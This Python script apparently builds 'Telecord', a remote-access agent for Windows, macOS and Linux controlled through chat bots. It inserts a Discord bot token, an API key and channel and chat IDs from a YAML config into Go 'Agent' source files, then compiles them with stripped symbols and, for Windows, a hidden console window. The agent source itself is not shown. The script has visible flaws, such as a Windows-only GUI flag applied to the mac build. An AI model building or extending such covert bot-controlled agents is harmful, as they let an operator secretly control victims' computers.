import yaml
import re
import subprocess
import argparse
import os
import platform

# Parse command-line arguments
parser = argparse.ArgumentParser()
parser.add_argument('-pl', choices=['windows', 'mac', 'linux'], required=True)
args = parser.parse_args()

# Set GOOS and GOARCH environment variables based on -pl argument
if args.pl == 'windows':
    os.environ['GOOS'] = 'windows'
    os.environ['GOARCH'] = 'amd64'
elif args.pl == 'mac':
    os.environ['GOOS'] = 'darwin'
    os.environ['GOARCH'] = 'amd64'
else:  # linux
    os.environ['GOOS'] = 'linux'
    os.environ['GOARCH'] = 'amd64'

# Read the YAML file
with open('config.yaml', 'r') as f:
    config = yaml.safe_load(f)

# Read the Go file


# Run the go build command
if platform.system() == 'Windows':
        if args.pl == 'linux':
            with open('Agent_linux.go', 'r') as f:
                go_file = f.read()

# Replace the constants in the Go file with the values from the YAML file
            go_file = re.sub(r'(const DISCORD_BOT_TOKEN = )".*"', r'\1"{}"'.format(config['DISCORD_BOT_TOKEN']), go_file)
            go_file = re.sub(r'(const BOT_API_KEY = )".*"', r'\1"{}"'.format(config['BOT_API_KEY']), go_file)
            go_file = re.sub(r'(const ANOTHER_DISCORD_CHANNEL_T_ID = )".*"', r'\1"{}"'.format(config['ANOTHER_DISCORD_CHANNEL_T_ID']), go_file)
            go_file = re.sub(r'(var CID int64 = ).*', r'\1{}'.format(config['CID']), go_file)

            # Write the updated Go file
            with open('Agent_linux.go', 'w') as f:
                f.write(go_file)
            subprocess.run("""go build -buildmode=pie -ldflags "-s -w " -o ./Output/Telecord Agent_linux.go""")

        elif args.pl == 'mac':
                with open('Agentmac.go', 'r') as f:
                    go_file = f.read()

# Replace the constants in the Go file with the values from the YAML file
                    go_file = re.sub(r'(const DISCORD_BOT_TOKEN = )".*"', r'\1"{}"'.format(config['DISCORD_BOT_TOKEN']), go_file)
                    go_file = re.sub(r'(const BOT_API_KEY = )".*"', r'\1"{}"'.format(config['BOT_API_KEY']), go_file)
                    go_file = re.sub(r'(const ANOTHER_DISCORD_CHANNEL_T_ID = )".*"', r'\1"{}"'.format(config['ANOTHER_DISCORD_CHANNEL_T_ID']), go_file)
                    go_file = re.sub(r'(var CID int64 = ).*', r'\1{}'.format(config['CID']), go_file)

            # Write the updated Go file
                with open('Agentmac.go', 'w') as f:
                    f.write(go_file)
                subprocess.run("""go build -buildmode=pie -ldflags "-s -w -H=windowsgui" -o ./Output/Telecord Agentmac.go""")
        elif args.pl == 'windows':
            with open('Agent.go', 'r') as f:
                    go_file = f.read()

# Replace the constants in the Go file with the values from the YAML file
                    go_file = re.sub(r'(const DISCORD_BOT_TOKEN = )".*"', r'\1"{}"'.format(config['DISCORD_BOT_TOKEN']), go_file)
                    go_file = re.sub(r'(const BOT_API_KEY = )".*"', r'\1"{}"'.format(config['BOT_API_KEY']), go_file)
                    go_file = re.sub(r'(const ANOTHER_DISCORD_CHANNEL_T_ID = )".*"', r'\1"{}"'.format(config['ANOTHER_DISCORD_CHANNEL_T_ID']), go_file)
                    go_file = re.sub(r'(var CID int64 = ).*', r'\1{}'.format(config['CID']), go_file)

            # Write the updated Go file
            with open('Agent.go', 'w') as f:
                    f.write(go_file)
            subprocess.run("""go build -buildmode=pie -ldflags "-s -w -H=windowsgui" -o ./Output/Telecord.exe Agent.go""")

else:
        
        if args.pl == 'linux':
            with open('Agent_linux.go', 'r') as f:
                    go_file = f.read()

# Replace the constants in the Go file with the values from the YAML file
                    go_file = re.sub(r'(const DISCORD_BOT_TOKEN = )".*"', r'\1"{}"'.format(config['DISCORD_BOT_TOKEN']), go_file)
                    go_file = re.sub(r'(const BOT_API_KEY = )".*"', r'\1"{}"'.format(config['BOT_API_KEY']), go_file)
                    go_file = re.sub(r'(const ANOTHER_DISCORD_CHANNEL_T_ID = )".*"', r'\1"{}"'.format(config['ANOTHER_DISCORD_CHANNEL_T_ID']), go_file)
                    go_file = re.sub(r'(var CID int64 = ).*', r'\1{}'.format(config['CID']), go_file)

            # Write the updated Go file
            with open('Agent_linux.go', 'w') as f:
                    f.write(go_file)
            subprocess.run("""go build -buildmode=pie -ldflags '-s -w' -o ./Output/Telecord Agent_linux.go""")
        elif args.pl == 'mac':
            with open('Agentmac.go', 'r') as f:
                    go_file = f.read()

# Replace the constants in the Go file with the values from the YAML file
                    go_file = re.sub(r'(const DISCORD_BOT_TOKEN = )".*"', r'\1"{}"'.format(config['DISCORD_BOT_TOKEN']), go_file)
                    go_file = re.sub(r'(const BOT_API_KEY = )".*"', r'\1"{}"'.format(config['BOT_API_KEY']), go_file)
                    go_file = re.sub(r'(const ANOTHER_DISCORD_CHANNEL_T_ID = )".*"', r'\1"{}"'.format(config['ANOTHER_DISCORD_CHANNEL_T_ID']), go_file)
                    go_file = re.sub(r'(var CID int64 = ).*', r'\1{}'.format(config['CID']), go_file)

            # Write the updated Go file
            with open('Agentmac.go', 'w') as f:
                    f.write(go_file)
            subprocess.run("""go build -buildmode=pie -ldflags '-s -w' -o ./Output/Telecord Agentmac.go""")
        elif args.pl == 'windows':
            with open('Agent.go', 'r') as f:
                    go_file = f.read()

# Replace the constants in the Go file with the values from the YAML file
                    go_file = re.sub(r'(const DISCORD_BOT_TOKEN = )".*"', r'\1"{}"'.format(config['DISCORD_BOT_TOKEN']), go_file)
                    go_file = re.sub(r'(const BOT_API_KEY = )".*"', r'\1"{}"'.format(config['BOT_API_KEY']), go_file)
                    go_file = re.sub(r'(const ANOTHER_DISCORD_CHANNEL_T_ID = )".*"', r'\1"{}"'.format(config['ANOTHER_DISCORD_CHANNEL_T_ID']), go_file)
                    go_file = re.sub(r'(var CID int64 = ).*', r'\1{}'.format(config['CID']), go_file)

            # Write the updated Go file
            with open('Agent.go', 'w') as f:
                    f.write(go_file)
            subprocess.run("""go build -buildmode=pie -ldflags '-s -w -H=windowsgui' -o ./Output/Telecord.exe Agent.go""")